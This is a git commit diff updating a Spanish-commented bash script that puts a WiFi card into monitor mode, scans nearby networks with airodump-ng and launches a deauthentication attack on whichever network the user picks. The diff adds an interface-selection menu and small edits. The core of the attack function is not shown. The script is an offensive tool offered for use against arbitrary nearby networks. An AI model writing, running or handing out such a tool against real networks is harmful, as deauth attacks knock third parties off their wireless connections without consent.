61c236e7989720eb447f8b1a27668a97355bcba7
cristianmusica <75284701+cristianmusica@users.noreply.github.com>
2023-12-16 14:57:06 -0300

    Update bash.sh

--- bash.sh
+++ bash.sh
@@ -1,51 +1,67 @@
 #!/bin/bash
 
 # Colores
-RED="\033[1;31m"  
+RED="\033[1;31m"
 GREEN="\033[1;32m"
-YELLOW="\033[1;33m" 
+YELLOW="\033[1;33m"
 WHITE="\033[1;37m"
 
-# Interfaz WiFi 
-IFACE="wlan0"
+IFACE=""
 
-# Pone interfaz en modo monitor
+# Muestra interfaces WiFi y permite elegir
+choose_iface() {
+
+  echo -e "\n${WHITE}Interfaces WiFi disponibles:"
+
+  ifaces=($(iwconfig 2>/dev/null | grep Wireless | awk '{print $1}'))
+
+  for ((i=0; i<${#ifaces[@]}; i++)); do
+    echo -e "${GREEN}$i) ${ifaces[$i]}"
+  done
+
+  read -p "Elige la interfaz a utilizar: " option
+
+  IFACE=${ifaces[$option]}
+
+}
+
+# Activa modo monitor en la interfaz  
 enable_monitor() {
 
   airmon-ng check kill
   ip link set $IFACE down
-  iw dev $IFACE set type monitor
+  iw dev $IFACE set type monitor 
   ip link set $IFACE up
 
 }
 
-# Regresa la interfaz a modo normal
+# Desactiva modo monitor
 disable_monitor() {
 
   ip link set $IFACE down
   iw dev $IFACE set type managed
-  ip link set $IFACE up
-  service network-manager restart
+  ip link set $IFACE up 
+  nmcli radio wifi on
   nmcli device connect $IFACE
 
 }
 
-# Encuentra las redes WiFi cercanas  
+# Encuentra redes WiFi disponibles
 get_targets() {
 
-  echo -e "\n${WHITE}Buscando redes WiFi disponibles...${WHITE}\n"
+  echo -e "\n${WHITE}Buscando redes WiFi disponibles...${WHITE}\n" 
 
-  networks=($(airodump-ng -a --band abg $IFACE | grep -w ESSID | awk -F' ' '{print $2}'))
+  nets=($(airodump-ng -a --band abg $IFACE | grep -w ESSID | awk -F' ' '{print $2}'))
 
   echo -e "${WHITE}Redes Encontradas:\n"
 
-  for ((i=0; i<${#networks[@]}; i++)); do
-    echo -e "${RED}$i) ${networks[$i]}"
-  done 
+  for ((i=0; i<${#nets[@]}; i++)); do
+    echo -e "${RED}$i) ${nets[$i]}"
+  done
 
 }
 
-# Realiza el ataque deauth
+# Realiza ataque deauth
 attack() {
 
   echo -e "\n${RED}[+] ${WHITE}Iniciando ataque Deauth a ${YELLOW}$1${WHITE}"
@@ -57,12 +73,12 @@ attack() {
 }
 
 # Flujo principal
+choose_iface
 enable_monitor
-get_targets
+get_targets   
 
 read -p "Ingresa el número de red a atacar: " target
-SSID=${networks[$target]}  
+SSID=${nets[$target]}
 
 attack $SSID
-
 disable_monitor
